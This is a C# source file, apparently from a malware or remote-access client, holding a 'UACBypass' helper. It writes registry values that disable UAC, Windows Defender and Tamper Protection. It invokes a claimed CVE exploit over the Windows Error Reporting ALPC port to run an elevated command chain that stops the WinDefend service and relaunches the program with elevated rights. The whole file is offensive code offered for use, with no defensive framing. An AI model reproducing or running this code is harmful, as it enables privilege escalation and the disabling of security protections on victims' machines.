using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using Microsoft.Win32;

namespace Client.Helper;

public class UACBypass
{
	private struct UNICODE_STRING
	{
		public ushort Length;

		public ushort MaximumLength;

		public IntPtr Buffer;
	}

	private struct ALPC_PORT_ATTRIBUTES
	{
		public uint Flags;

		public SECURITY_QUALITY_OF_SERVICE SecurityQos;

		public IntPtr MaxMessageLength;

		public IntPtr MemoryBandwidth;

		public IntPtr MaxPoolUsage;

		public IntPtr MaxSectionSize;

		public IntPtr MaxViewSize;

		public IntPtr MaxTotalSectionSize;

		public uint DupObjectTypes;

		public uint Reserved;
	}

	private struct SECURITY_QUALITY_OF_SERVICE
	{
		public uint Length;

		public uint ImpersonationLevel;

		public byte ContextTrackingMode;

		public byte EffectiveOnly;
	}

	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	private struct WER_ALPC_MESSAGE
	{
		public uint messageType;

		public uint method;

		public uint processId;

		public uint sharedMemoryHandle;

		public uint commandLineLength;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 260)]
		public char[] commandLine;
	}

	private struct ConnectMsg
	{
		public uint MessageId;

		public uint Unknown;
	}

	private const uint SECURITY_IMPERSONATION = 2u;

	private const uint SECURITY_DYNAMIC_TRACKING = 1u;

	private const uint PAGE_READWRITE = 4u;

	private const uint FILE_MAP_WRITE = 2u;

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern int WinExec(string exeName, int operType);

	[DllImport("ntdll.dll", SetLastError = true)]
	private static extern uint NtAlpcConnectPort(out IntPtr PortHandle, ref UNICODE_STRING PortName, IntPtr ObjectAttributes, ref ALPC_PORT_ATTRIBUTES PortAttributes, uint Flags, ref SECURITY_QUALITY_OF_SERVICE RequiredServerSecurity, IntPtr ConnectionMessage, ref IntPtr MessageLength, IntPtr ConnectionInfo, IntPtr ConnectionInfoLength);

	[DllImport("ntdll.dll", SetLastError = true)]
	private static extern uint NtAlpcSendWaitReceivePort(IntPtr PortHandle, uint Flags, ref WER_ALPC_MESSAGE SendMessage, ref IntPtr SendMessageLength, IntPtr ReceiveMessage, IntPtr ReceiveMessageLength, IntPtr ReceiveBuffer, IntPtr Timeout);

	[DllImport("ntdll.dll")]
	private static extern void RtlInitUnicodeString(ref UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] string SourceString);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern IntPtr CreateFileMapping(IntPtr hFile, IntPtr lpAttributes, uint flProtect, uint dwMaximumSizeHigh, uint dwMaximumSizeLow, string lpName);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern IntPtr MapViewOfFile(IntPtr hFileMappingObject, uint dwDesiredAccess, uint dwFileOffsetHigh, uint dwFileOffsetLow, IntPtr dwNumberOfBytesToMap);

	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool UnmapViewOfFile(IntPtr lpBaseAddress);

	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool CloseHandle(IntPtr hObject);

	public static void DisableUAC()
	{
		try
		{
			using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true))
			{
				if (registryKey != null)
				{
					registryKey.SetValue("EnableLUA", 0, RegistryValueKind.DWord);
					registryKey.SetValue("ConsentPromptBehaviorAdmin", 0, RegistryValueKind.DWord);
					registryKey.SetValue("ConsentPromptBehaviorUser", 0, RegistryValueKind.DWord);
					registryKey.SetValue("PromptOnSecureDesktop", 0, RegistryValueKind.DWord);
					registryKey.SetValue("FilterAdministratorToken", 0, RegistryValueKind.DWord);
					registryKey.SetValue("EnableUIADesktopToggle", 1, RegistryValueKind.DWord);
				}
			}
			using (RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Policies\\Microsoft\\Windows Defender", writable: true))
			{
				registryKey2?.SetValue("DisableAntiSpyware", 1, RegistryValueKind.DWord);
			}
			using RegistryKey registryKey3 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows Defender\\Features", writable: true);
			registryKey3?.SetValue("TamperProtection", 0, RegistryValueKind.DWord);
		}
		catch
		{
		}
	}

	private static bool ExploitCVE202620817(string commandLine)
	{
		IntPtr intPtr = IntPtr.Zero;
		IntPtr intPtr2 = IntPtr.Zero;
		IntPtr PortHandle = IntPtr.Zero;
		try
		{
			uint num = 520u;
			intPtr = CreateFileMapping(new IntPtr(-1), IntPtr.Zero, 4u, 0u, num, null);
			if (intPtr == IntPtr.Zero)
			{
				return false;
			}
			intPtr2 = MapViewOfFile(intPtr, 2u, 0u, 0u, new IntPtr(num));
			if (intPtr2 == IntPtr.Zero)
			{
				return false;
			}
			byte[] bytes = Encoding.Unicode.GetBytes(commandLine + "\0");
			Marshal.Copy(bytes, 0, intPtr2, Math.Min(bytes.Length, (int)num));
			UNICODE_STRING DestinationString = default(UNICODE_STRING);
			RtlInitUnicodeString(ref DestinationString, "\\WindowsErrorReportingService");
			ALPC_PORT_ATTRIBUTES PortAttributes = new ALPC_PORT_ATTRIBUTES
			{
				MaxMessageLength = new IntPtr(Marshal.SizeOf(typeof(WER_ALPC_MESSAGE)) + 4096)
			};
			SECURITY_QUALITY_OF_SERVICE RequiredServerSecurity = new SECURITY_QUALITY_OF_SERVICE
			{
				Length = (uint)Marshal.SizeOf(typeof(SECURITY_QUALITY_OF_SERVICE)),
				ImpersonationLevel = 2u,
				ContextTrackingMode = 1,
				EffectiveOnly = 0
			};
			ConnectMsg structure = new ConnectMsg
			{
				MessageId = 13u,
				Unknown = 0u
			};
			IntPtr intPtr3 = Marshal.AllocHGlobal(Marshal.SizeOf(structure));
			Marshal.StructureToPtr(structure, intPtr3, fDeleteOld: false);
			IntPtr MessageLength = new IntPtr(Marshal.SizeOf(structure));
			uint num2 = NtAlpcConnectPort(out PortHandle, ref DestinationString, IntPtr.Zero, ref PortAttributes, 0u, ref RequiredServerSecurity, intPtr3, ref MessageLength, IntPtr.Zero, IntPtr.Zero);
			Marshal.FreeHGlobal(intPtr3);
			if (num2 != 0)
			{
				return false;
			}
			WER_ALPC_MESSAGE SendMessage = new WER_ALPC_MESSAGE
			{
				method = 13u,
				processId = (uint)Process.GetCurrentProcess().Id,
				sharedMemoryHandle = (uint)intPtr.ToInt64(),
				commandLineLength = (uint)(commandLine.Length * 2),
				commandLine = new char[260]
			};
			IntPtr SendMessageLength = new IntPtr(Marshal.SizeOf(typeof(WER_ALPC_MESSAGE)));
			return NtAlpcSendWaitReceivePort(PortHandle, 0u, ref SendMessage, ref SendMessageLength, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero) == 0;
		}
		catch
		{
			return false;
		}
		finally
		{
			if (intPtr2 != IntPtr.Zero)
			{
				UnmapViewOfFile(intPtr2);
			}
			if (intPtr != IntPtr.Zero)
			{
				CloseHandle(intPtr);
			}
			if (PortHandle != IntPtr.Zero)
			{
				CloseHandle(PortHandle);
			}
		}
	}

	public static void Run()
	{
		try
		{
			if (!(Config.Privilege == "Admin"))
			{
				string fileName = Process.GetCurrentProcess().MainModule.FileName;
				if (ExploitCVE202620817("cmd.exe /c reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v EnableLUA /t REG_DWORD /d 0 /f & reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f & reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f & reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v FilterAdministratorToken /t REG_DWORD /d 0 /f & reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features\" /v TamperProtection /t REG_DWORD /d 0 /f & reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v DisableAntiSpyware /t REG_DWORD /d 1 /f & sc stop WinDefend & sc config WinDefend start= disabled & start /b \"\" \"" + fileName + "\" --elevated"))
				{
					Thread.Sleep(2000);
					Environment.Exit(0);
				}
			}
		}
		catch
		{
		}
	}
}
